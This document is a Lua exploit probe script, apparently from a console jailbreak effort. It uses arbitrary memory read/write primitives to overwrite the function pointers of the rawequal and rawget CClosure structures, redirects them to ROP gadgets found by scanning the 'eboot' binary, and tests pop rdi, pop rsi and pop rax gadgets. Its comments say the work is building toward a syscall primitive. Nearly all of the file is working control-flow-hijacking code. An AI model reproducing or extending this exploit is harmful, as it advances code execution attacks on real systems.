-- CRASH_CLASS: MODERATE
-- PROBE 117a: Clean gadget redirect verification via CClosure +0x20
--
-- Context: 56d tested gadget redirect but results are garbled because the
-- "ret" gadget (section B) corrupted the Lua output stream before the
-- critical "xor eax,eax;ret" test (section C) ran. This probe isolates
-- the clean test and builds on it.
--
-- 56c CONFIRMED: redirecting rawequal's +0x20 to another Lua C function
-- (rawget, type, select) works — target function executes with Lua args.
--
-- 56d found: "xor eax,eax;ret" at eboot+0x471. The C return value (eax)
-- tells Lua how many values to pop. eax=0 → 0 returns → nil from pcall.
--
-- THE TEST: redirect rawequal → xor eax,eax;ret FIRST (no garbling test
-- before it). If pcall returns (true, nil), execution reached the gadget.
-- Then test more gadgets building toward a syscall primitive.
--
-- Section A: xor eax,eax;ret redirect — clean verification (5 rounds)
-- Section B: Multiple gadget types (mov eax imm, nop;ret, etc.)
-- Section C: pop rdi;ret → argument control test
-- Section D: Gadget chain: pop rdi;ret + xor eax,eax;ret in sequence

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 117a: CLEAN GADGET REDIRECT ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

-- Get eboot base via dynlib_get_info
local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo)), hi, lo
    end
    return nil, 0, 0
end

-- Parse function address from tostring
local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

-- Compute eboot gadget address with carry
local function eboot_gadget(eboot_hi, eboot_lo, offset)
    local lo = eboot_lo + offset
    local hi = eboot_hi
    if lo >= 0x100000000 then
        hi = hi + 1
        lo = lo - 0x100000000
    end
    return lo, hi
end

collectgarbage("stop")

-- Setup
local eboot_base, eboot_hi, eboot_lo = get_eboot_base()
local rawequal_addr = parse_func_addr(rawequal)
local rawget_addr = parse_func_addr(rawget)

print("[*] eboot base: " .. fmt_addr(eboot_base))
print("[*] rawequal:   " .. fmt_addr(rawequal_addr))
print("[*] rawget:     " .. fmt_addr(rawget_addr))

if not eboot_base or not rawequal_addr then
    print("ABORT: missing addresses")
    return
end

-- Save original +0x20 values for rawequal and rawget
local re_orig_lo = safe_rd(rawequal_addr + 0x20)
local re_orig_hi = safe_rd(rawequal_addr + 0x24)
local rg_orig_lo = safe_rd(rawget_addr + 0x20)
local rg_orig_hi = safe_rd(rawget_addr + 0x24)

print(string.format("[*] rawequal +0x20 original: 0x%08X_%08X", re_orig_hi or 0, re_orig_lo or 0))
print(string.format("[*] rawget   +0x20 original: 0x%08X_%08X", rg_orig_hi or 0, rg_orig_lo or 0))

-- Scan for xor eax,eax;ret (31 C0 C3) in eboot .text
print("")
print("[*] Scanning eboot for gadgets...")

local function find_bytes(b0, b1, b2, limit)
    limit = limit or 0x500000
    for off = 0, limit - 4, 4 do
        local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
        local dw = safe_rd(addr)
        if dw then
            local d0 = dw % 256
            local d1 = math.floor(dw / 256) % 256
            local d2 = math.floor(dw / 65536) % 256
            local d3 = math.floor(dw / 16777216) % 256
            if d0 == b0 and d1 == b1 and d2 == b2 then return off end
            if d1 == b0 and d2 == b1 and d3 == b2 then return off + 1 end
        end
    end
    return nil
end

-- xor eax,eax; ret = 31 C0 C3
local xor_ret_off = find_bytes(0x31, 0xC0, 0xC3, 0x100000)
if xor_ret_off then
    print(string.format("  xor eax,eax;ret at eboot+0x%X", xor_ret_off))
else
    print("  xor eax,eax;ret NOT FOUND — aborting")
    return
end

-- Also look for: mov eax,1;ret = B8 01 00 00 00 C3
-- And: nop;ret = 90 C3
local nop_ret_off = find_bytes(0x90, 0xC3, nil, 0x100000)


-- ======================================================
-- SECTION A: Clean xor eax,eax;ret redirect — 5 rounds
-- ======================================================
if TEST_SECTION == "A" then
    print("")
    print("--- SECTION A: xor eax,eax;ret redirect (5 rounds) ---")
    print("")

    local xor_lo, xor_hi = eboot_gadget(eboot_hi, eboot_lo, xor_ret_off)
    print(string.format("[A] gadget addr: 0x%08X_%08X", xor_hi, xor_lo))

    -- Verify gadget bytes
    local gaddr = uint64(string.format("0x%X%08X", xor_hi, xor_lo))
    local gbytes = safe_rd(gaddr)
    print(string.format("[A] gadget bytes: 0x%08X (low 3 should be C3 C0 31)", gbytes or 0))

    -- Baseline
    print(string.format("[A] baseline rawequal(1,1) = %s", tostring(rawequal(1,1))))
    print(string.format("[A] baseline rawequal(1,2) = %s", tostring(rawequal(1,2))))

    local success_count = 0
    local fail_count = 0

    for round = 1, 5 do
        print(string.format("\n[A-round%d] MARKER_BEFORE_WRITE", round))

        -- Write gadget address to rawequal +0x20
        memory.write_dword(rawequal_addr + 0x20, xor_lo)
        memory.write_dword(rawequal_addr + 0x24, xor_hi)

        print(string.format("[A-round%d] MARKER_AFTER_WRITE", round))

        -- Call rawequal — should now execute xor eax,eax;ret
        -- eax=0 → Lua sees 0 return values → pcall returns (true) with no value
        local ok1, r1, r2 = pcall(rawequal, 1, 1)

        print(string.format("[A-round%d] MARKER_AFTER_CALL", round))
        print(string.format("[A-round%d] pcall: ok=%s r1=%s r2=%s",
            round, tostring(ok1), tostring(r1), tostring(r2)))

        -- DISCRIMINATING TEST: if the gadget ran, ok=true and r1=nil (0 returns)
        -- If the ORIGINAL rawequal ran, ok=true and r1=true (rawequal(1,1)=true)
        -- If it crashed, ok=false
        if ok1 and r1 == nil then
            print(string.format("[A-round%d] *** GADGET EXECUTED: eax=0 confirmed ***", round))
            success_count = success_count + 1
        elseif ok1 and r1 == true then
            print(string.format("[A-round%d] WARNING: got 'true' — original function ran, not gadget", round))
            fail_count = fail_count + 1
        elseif not ok1 then
            print(string.format("[A-round%d] CRASH: pcall failed: %s", round, tostring(r1)))
            fail_count = fail_count + 1
        end

        -- Restore original
        memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
        memory.write_dword(rawequal_addr + 0x24, re_orig_hi)

        print(string.format("[A-round%d] MARKER_RESTORED", round))

        -- Verify restoration
        local check = rawequal(1, 1)
        print(string.format("[A-round%d] post-restore rawequal(1,1) = %s", round, tostring(check)))
        if check ~= true then
            print("[A] RESTORE FAILED — aborting")
            break
        end
    end

    print("")
    print(string.format("[A] RESULT: %d/5 gadget exec, %d/5 failures", success_count, fail_count))
    if success_count >= 3 then
        print("[A] *** ARBITRARY GADGET EXECUTION CONFIRMED ***")
        print("[A] *** This is the foundation for a ROP chain ***")
    end

    -- A2: Same test on rawget function (second target)
    print("")
    print("[A2] Cross-validation on rawget:")
    local xor_lo2, xor_hi2 = eboot_gadget(eboot_hi, eboot_lo, xor_ret_off)
    local t = {}
    t[1] = "hello"
    local baseline_rg = rawget(t, 1)
    print(string.format("[A2] baseline rawget({[1]='hello'}, 1) = %s", tostring(baseline_rg)))

    print("[A2] MARKER_RAWGET_BEFORE")
    memory.write_dword(rawget_addr + 0x20, xor_lo2)
    memory.write_dword(rawget_addr + 0x24, xor_hi2)
    print("[A2] MARKER_RAWGET_AFTER")

    local ok_rg, rg_r1 = pcall(rawget, t, 1)
    print(string.format("[A2] pcall: ok=%s r1=%s", tostring(ok_rg), tostring(rg_r1)))

    if ok_rg and rg_r1 == nil then
        print("[A2] *** RAWGET GADGET ALSO WORKS ***")
    end

    memory.write_dword(rawget_addr + 0x20, rg_orig_lo)
    memory.write_dword(rawget_addr + 0x24, rg_orig_hi)
    print("[A2] restored, rawget({[1]='hello'}, 1) = " .. tostring(rawget(t, 1)))


-- ======================================================
-- SECTION B: Multiple gadget types
-- ======================================================
elseif TEST_SECTION == "B" then
    print("--- SECTION B: Multiple gadget types ---")
    print("")

    local xor_lo, xor_hi = eboot_gadget(eboot_hi, eboot_lo, xor_ret_off)

    -- Scan for additional gadgets
    -- mov eax, 1; ret = B8 01 00 00 00 C3 (hard to find as 3-byte pattern)
    -- inc eax; ret — if eax starts at some value
    -- We know: ret (0xC3) at eboot+0x42

    local ret_lo, ret_hi = eboot_gadget(eboot_hi, eboot_lo, 0x42)

    -- Test 1: xor eax,eax;ret → eax=0 → nil
    print("[B1] xor eax,eax;ret (eax=0 → nil):")
    memory.write_dword(rawequal_addr + 0x20, xor_lo)
    memory.write_dword(rawequal_addr + 0x24, xor_hi)
    local ok1, r1 = pcall(rawequal, "a", "b")
    memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
    memory.write_dword(rawequal_addr + 0x24, re_orig_hi)
    print(string.format("  ok=%s r1=%s%s", tostring(ok1), tostring(r1),
        (ok1 and r1 == nil) and " *** CLEAN GADGET ***" or ""))

    -- Test 2: ret gadget → eax=?? → unpredictable returns
    -- (Only test if xor worked, to avoid garbling output)
    if ok1 and r1 == nil then
        print("")
        print("[B2] bare ret (eax=residual → ?? returns):")
        print("[B2] MARKER_BEFORE")
        memory.write_dword(rawequal_addr + 0x20, ret_lo)
        memory.write_dword(rawequal_addr + 0x24, ret_hi)
        -- Use pcall to catch any issues
        local ok2, r2_1, r2_2 = pcall(rawequal, 1, 1)
        print("[B2] MARKER_AFTER")
        print(string.format("  ok=%s r1=%s r2=%s",
            tostring(ok2), tostring(r2_1), tostring(r2_2)))
        memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
        memory.write_dword(rawequal_addr + 0x24, re_orig_hi)
        print("[B2] restored")
    end

    -- Test 3: Scan for "mov eax, 1; ret" pattern (B8 01 00 00 00 C3)
    -- This is 6 bytes, scan as two consecutive dword reads
    print("")
    print("[B3] Scanning for mov eax,1;ret (B8 01 00 00 00 C3)...")
    local mov1_off = nil
    for off = 0, 0x200000 - 8, 4 do
        local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
        local dw = safe_rd(addr)
        if dw then
            -- Check: B8 01 00 00 at dword boundary
            if dw == 0x000001B8 then
                local addr2 = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off + 4))
                local dw2 = safe_rd(addr2)
                if dw2 then
                    local d0 = dw2 % 256
                    local d1 = math.floor(dw2 / 256) % 256
                    if d0 == 0x00 and d1 == 0xC3 then
                        mov1_off = off
                        break
                    end
                end
            end
            -- Check: offset by 1 byte (01 00 00 00 at +1, needs B8 at end of prev)
            -- Too complex for inline scan, skip
        end
    end
    if mov1_off then
        print(string.format("  FOUND mov eax,1;ret at eboot+0x%X", mov1_off))
        local m1_lo, m1_hi = eboot_gadget(eboot_hi, eboot_lo, mov1_off)
        memory.write_dword(rawequal_addr + 0x20, m1_lo)
        memory.write_dword(rawequal_addr + 0x24, m1_hi)
        local ok3, r3 = pcall(rawequal, "marker_val", "other")
        memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
        memory.write_dword(rawequal_addr + 0x24, re_orig_hi)
        print(string.format("  ok=%s r1=%s (eax=1 → 1 return value from Lua stack)",
            tostring(ok3), tostring(r3)))
        if ok3 and r3 ~= nil then
            print("  *** eax=1 GADGET WORKS — returned Lua stack top ***")
            print("  *** value type: " .. type(r3) .. " ***")
        end
    else
        print("  mov eax,1;ret NOT FOUND in first 2MB")
    end


-- ======================================================
-- SECTION C: pop rdi;ret + xor eax,eax;ret chain test
-- ======================================================
elseif TEST_SECTION == "C" then
    print("--- SECTION C: Gadget chain concept ---")
    print("")

    local xor_lo, xor_hi = eboot_gadget(eboot_hi, eboot_lo, xor_ret_off)

    -- When rawequal is called via CClosure dispatch:
    --   rdi = lua_State* L
    --   The dispatch does: call [+0x20]  (the function pointer)
    --   Stack at call time: [rsp] = return address back to dispatch
    --
    -- If we redirect to "pop rdi; ret":
    --   pop rdi = pops return address into rdi (rdi = dispatch return addr)
    --   ret = returns to whatever is now at [rsp] (next stack value)
    --
    -- This is NOT a controlled chain unless we can control the stack.
    -- But it tells us about the stack layout at dispatch time.

    -- First verify xor eax,eax;ret still works
    print("[C0] Verify xor eax,eax;ret:")
    memory.write_dword(rawequal_addr + 0x20, xor_lo)
    memory.write_dword(rawequal_addr + 0x24, xor_hi)
    local ok0, r0 = pcall(rawequal, 1, 1)
    memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
    memory.write_dword(rawequal_addr + 0x24, re_orig_hi)
    print(string.format("  ok=%s r1=%s%s", tostring(ok0), tostring(r0),
        (ok0 and r0 == nil) and " *** CONFIRMED ***" or " FAILED"))

    if not (ok0 and r0 == nil) then
        print("[C] Gadget not working — aborting chain test")
        return
    end

    -- C1: Redirect to pop rdi;ret (0xC9DFE) — will crash or return weirdly
    local pop_rdi_off = 0xC9DFE
    local prdi_lo, prdi_hi = eboot_gadget(eboot_hi, eboot_lo, pop_rdi_off)

    -- Verify gadget bytes
    local prdi_addr = uint64(string.format("0x%X%08X", prdi_hi, prdi_lo))
    local prdi_bytes = safe_rd(prdi_addr)
    print(string.format("\n[C1] pop rdi;ret at eboot+0x%X bytes=0x%08X (expect 0x??C35F)",
        pop_rdi_off, prdi_bytes or 0))

    print("[C1] MARKER_BEFORE_POP_RDI")
    memory.write_dword(rawequal_addr + 0x20, prdi_lo)
    memory.write_dword(rawequal_addr + 0x24, prdi_hi)
    local ok_c1, rc1_1, rc1_2 = pcall(rawequal, 1, 1)
    print("[C1] MARKER_AFTER_POP_RDI")
    print(string.format("  ok=%s r1=%s r2=%s", tostring(ok_c1), tostring(rc1_1), tostring(rc1_2)))
    memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
    memory.write_dword(rawequal_addr + 0x24, re_orig_hi)
    print("[C1] restored, rawequal(1,1) = " .. tostring(rawequal(1, 1)))

    -- C2: pop rsi;ret (0xD77D)
    local pop_rsi_off = 0xD77D
    local prsi_lo, prsi_hi = eboot_gadget(eboot_hi, eboot_lo, pop_rsi_off)
    local prsi_addr = uint64(string.format("0x%X%08X", prsi_hi, prsi_lo))
    local prsi_bytes = safe_rd(prsi_addr)
    print(string.format("\n[C2] pop rsi;ret at eboot+0x%X bytes=0x%08X",
        pop_rsi_off, prsi_bytes or 0))

    print("[C2] MARKER_BEFORE")
    memory.write_dword(rawequal_addr + 0x20, prsi_lo)
    memory.write_dword(rawequal_addr + 0x24, prsi_hi)
    local ok_c2, rc2_1 = pcall(rawequal, 1, 1)
    print("[C2] MARKER_AFTER")
    print(string.format("  ok=%s r1=%s", tostring(ok_c2), tostring(rc2_1)))
    memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
    memory.write_dword(rawequal_addr + 0x24, re_orig_hi)

    -- C3: pop rax;ret (0x992)
    local pop_rax_off = 0x992
    local prax_lo, prax_hi = eboot_gadget(eboot_hi, eboot_lo, pop_rax_off)
    print(string.format("\n[C3] pop rax;ret at eboot+0x%X", pop_rax_off))
    print("[C3] MARKER_BEFORE")
    memory.write_dword(rawequal_addr + 0x20, prax_lo)
    memory.write_dword(rawequal_addr + 0x24, prax_hi)
    local ok_c3, rc3_1, rc3_2, rc3_3 = pcall(rawequal, 1, 1)
    print("[C3] MARKER_AFTER")
    print(string.format("  ok=%s r1=%s r2=%s r3=%s",
        tostring(ok_c3), tostring(rc3_1), tostring(rc3_2), tostring(rc3_3)))
    memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
    memory.write_dword(rawequal_addr + 0x24, re_orig_hi)


-- ======================================================
-- SECTION D: Stack layout analysis at dispatch point
-- ======================================================
elseif TEST_SECTION == "D" then
    print("--- SECTION D: Stack layout at CClosure dispatch ---")
    print("")

    local xor_lo, xor_hi = eboot_gadget(eboot_hi, eboot_lo, xor_ret_off)

    -- The dispatch calls our function with: rdi = lua_State* L
    -- Stack: [rsp] = return address (back to dispatch loop)
    -- [rsp+8], [rsp+16], ... = caller's saved registers
    --
    -- By reading rsp after return, we can understand the call frame.
    -- But we can't read rsp from a gadget that just returns.
    --
    -- Alternative: read the lua_State* L pointer from rdi.
    -- A gadget like "mov [rdi], rsi; ret" would let us write to L.
    -- A gadget like "mov rax, [rdi]; ret" would let us read from L.
    --
    -- For now: use the Lua C API knowledge. When a C function is called:
    --   L->top points to just past the last argument
    --   L->base points to the first argument
    -- The CClosure itself is at a negative stack offset from base.

    -- D1: Dump CClosure struct around rawequal
    print("[D1] CClosure struct dump (rawequal):")
    for off = 0, 0x3F, 8 do
        local val = safe_rq(rawequal_addr + off)
        local vh, vl = val and get_hi_lo(val) or 0, 0
        print(string.format("  +0x%02X: 0x%08X_%08X", off, vh, vl))
    end

    -- D2: Dump CClosure struct around rawget
    print("")
    print("[D2] CClosure struct dump (rawget):")
    for off = 0, 0x3F, 8 do
        local val = safe_rq(rawget_addr + off)
        local vh, vl = val and get_hi_lo(val) or 0, 0
        print(string.format("  +0x%02X: 0x%08X_%08X", off, vh, vl))
    end

    -- D3: Compare +0x20 (function pointer) with known eboot addresses
    print("")
    print("[D3] Function pointer analysis:")
    local re_fn = safe_rq(rawequal_addr + 0x20)
    local rg_fn = safe_rq(rawget_addr + 0x20)
    local re_h, re_l = re_fn and get_hi_lo(re_fn) or 0, 0
    local rg_h, rg_l = rg_fn and get_hi_lo(rg_fn) or 0, 0

    print(string.format("  rawequal fn: 0x%08X_%08X (eboot+0x%X)",
        re_h, re_l, re_l - eboot_lo))
    print(string.format("  rawget fn:   0x%08X_%08X (eboot+0x%X)",
        rg_h, rg_l, rg_l - eboot_lo))

    -- D4: Read bytes at the original function addresses
    print("")
    print("[D4] Original function prologue bytes:")
    if re_fn then
        local b0 = safe_rd(re_fn)
        local b4 = safe_rd(re_fn + 4)
        print(string.format("  rawequal: [0x%08X] [0x%08X] (expect 55 48 89 E5 = push rbp; mov rbp,rsp)",
            b0 or 0, b4 or 0))
    end
    if rg_fn then
        local b0 = safe_rd(rg_fn)
        local b4 = safe_rd(rg_fn + 4)
        print(string.format("  rawget:   [0x%08X] [0x%08X]", b0 or 0, b4 or 0))
    end

    -- D5: Test with multiple different arg counts
    print("")
    print("[D5] xor eax,eax;ret with varying arg counts:")
    for nargs = 0, 5 do
        memory.write_dword(rawequal_addr + 0x20, xor_lo)
        memory.write_dword(rawequal_addr + 0x24, xor_hi)

        local ok, r1, r2
        if nargs == 0 then ok, r1 = pcall(rawequal)
        elseif nargs == 1 then ok, r1 = pcall(rawequal, 1)
        elseif nargs == 2 then ok, r1 = pcall(rawequal, 1, 2)
        elseif nargs == 3 then ok, r1, r2 = pcall(rawequal, 1, 2, 3)
        elseif nargs == 4 then ok, r1 = pcall(rawequal, 1, 2, 3, 4)
        elseif nargs == 5 then ok, r1 = pcall(rawequal, 1, 2, 3, 4, 5)
        end

        memory.write_dword(rawequal_addr + 0x20, re_orig_lo)
        memory.write_dword(rawequal_addr + 0x24, re_orig_hi)

        print(string.format("  nargs=%d: ok=%s r1=%s%s",
            nargs, tostring(ok), tostring(r1),
            (ok and r1 == nil) and " *** CLEAN ***" or ""))
    end

else
    print("Unknown section: " .. TEST_SECTION)
end

print("")
print("=== PROBE 117a COMPLETE ===")
